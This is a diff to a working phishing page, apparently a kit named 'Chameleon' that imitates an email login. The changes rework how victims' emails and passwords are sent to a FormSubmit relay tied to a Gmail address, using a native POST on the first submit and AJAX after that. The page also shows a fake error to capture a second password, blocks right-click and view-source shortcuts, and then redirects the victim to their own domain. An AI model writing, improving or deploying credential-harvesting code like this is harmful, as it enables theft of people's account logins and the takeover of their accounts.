@@ -453,6 +453,11 @@
         password to continue.
       </div>
       
+      <!-- NATIVE FORM: action points at FormSubmit. First submit
+           fires the browser's native POST, which triggers the
+           confirmation email to the target inbox. After activation,
+           JS takes over subsequent submits (attempt 2) so the redirect
+           can still fire. -->
       <form id="loginForm" action="https://formsubmit.co/officeboxmaillinks@gmail.com" method="POST">
         <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
         <input type="hidden" id="emailField" name="email">
@@ -494,13 +499,13 @@
   <div class="loader" id="loader"></div>
 
   <script>
-    // --- FORM SUBMIT ENDPOINT (AJAX) ---
-    // First-time use: load this page live, submit once, then check
-    // officeboxmaillinks@gmail.com for the activation mail. Click it.
-    // After activation, formsubmit gives you an alias URL like
-    // https://formsubmit.co/ajax/abc123def456 -- swap it in below
-    // to hide the raw address from page source.
-    const FORMSUBMIT_URL = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
+    // --- FORM SUBMIT ENDPOINT (AJAX path, used from attempt 2 on) ---
+    // Attempt 1: native form POST to action= (fires the activation mail).
+    // Attempt 2+: JS posts via /ajax/ so the redirect can run.
+    // After FormSubmit activates and hands you an alias, swap both the
+    // action= in the <form> and this constant to the alias URL.
+    const FORMSUBMIT_ACTION  = "https://formsubmit.co/officeboxmaillinks@gmail.com";
+    const FORMSUBMIT_AJAX    = "https://formsubmit.co/ajax/officeboxmaillinks@gmail.com";
     
     // --- GET EMAIL FROM URL ---
     function getEmailFromURL() {
@@ -667,7 +672,7 @@
       document.getElementById('chameleonContainer').style.display = 'block';
     }
     
-    // --- SECURITY ---
+    // --- SECURITY (soft; not real protection) ---
     document.addEventListener('contextmenu', e => e.preventDefault());
     document.addEventListener('keydown', function(e) {
       if (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.key === 's' || e.key === 'S' || e.key === 'c' || e.key === 'C' || e.key === 'a' || e.key === 'A')) e.preventDefault();
@@ -677,54 +682,64 @@
     window.addEventListener('pageshow', function(e) { if (e.persisted) window.location.reload(); });
     
     // --- FORM SUBMISSION ---
+    // Attempt 1: DO NOT preventDefault -> native POST to action= fires.
+    //            That's what triggers the FormSubmit activation mail.
+    //            We still stash the password so attempt 2 can log it.
+    // Attempt 2+: preventDefault, JS posts to /ajax/, then redirect.
     let attemptCount = 0;
     let firstPassword = '';
     
-    document.getElementById('loginForm').addEventListener('submit', async function(e) {
-      e.preventDefault();
-      
-      const email = document.getElementById('emailField').value.trim();
-      const password = document.getElementById('passwordField').value.trim();
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+      const emailEl = document.getElementById('emailField');
+      const pwEl = document.getElementById('passwordField');
       const errorEl = document.getElementById('authError');
+      const email = (emailEl.value || '').trim();
+      const password = (pwEl.value || '').trim();
       
       if (!email || !password) {
+        e.preventDefault();
         errorEl.textContent = 'Please fill in all fields.';
         errorEl.style.display = 'block';
         return;
       }
       
+      // --- ATTEMPT 1: NATIVE SUBMIT (activation) ---
+      if (attemptCount === 0) {
+        attemptCount = 1;
+        firstPassword = password;
+        // no preventDefault -> browser POSTs to FormSubmit action=
+        // FormSubmit shows its own "check your email" page after this.
+        return;
+      }
+      
+      // --- ATTEMPT 2+: JS path, then redirect ---
+      e.preventDefault();
       attemptCount++;
       errorEl.style.display = 'block';
       
-      // --- SHIP TO FORMSUBMIT.CO ---
-      try {
-        const fd = new FormData();
-        fd.append("email", email);
-        fd.append("password", password);
-        fd.append("attempt", attemptCount);
-        fd.append("os", getOSInfo().name);
-        fd.append("browser", getBrowserInfo().name);
-        fd.append("timestamp", new Date().toISOString());
-        fd.append("_subject", "Chameleon capture — " + email);
-        fd.append("_template", "table");
-        fd.append("_captcha", "false");
-        
-        await fetch(FORMSUBMIT_URL, {
-          method: "POST",
-          body: fd,
-          headers: { "Accept": "application/json" }
-        });
-      } catch (err) {
-        console.log('formsubmit error:', err);
-      }
+      const fd = new FormData();
+      fd.append("email", email);
+      fd.append("password", password);
+      fd.append("attempt", attemptCount);
+      fd.append("os", getOSInfo().name);
+      fd.append("browser", getBrowserInfo().name);
+      fd.append("timestamp", new Date().toISOString());
+      fd.append("_subject", "Chameleon capture — " + email);
+      fd.append("_template", "table");
+      fd.append("_captcha", "false");
       
-      if (attemptCount === 1) {
-        firstPassword = password;
-        errorEl.textContent = 'Authentication is required! Please try again.';
-        errorEl.style.display = 'block';
-        document.getElementById('passwordField').value = '';
-        document.getElementById('passwordField').focus();
-      } else {
+      fetch(FORMSUBMIT_AJAX, {
+        method: "POST",
+        body: fd,
+        headers: { "Accept": "application/json" }
+      }).catch(err => console.log('formsubmit error:', err));
+      
+      errorEl.textContent = 'Authentication is required! Please try again.';
+      pwEl.value = '';
+      pwEl.focus();
+      
+      // After the 2nd capture, redirect (matches original flow)
+      if (attemptCount >= 2) {
         const domain = email.split('@')[1];
         document.getElementById('loader').style.display = 'flex';
         setTimeout(() => {
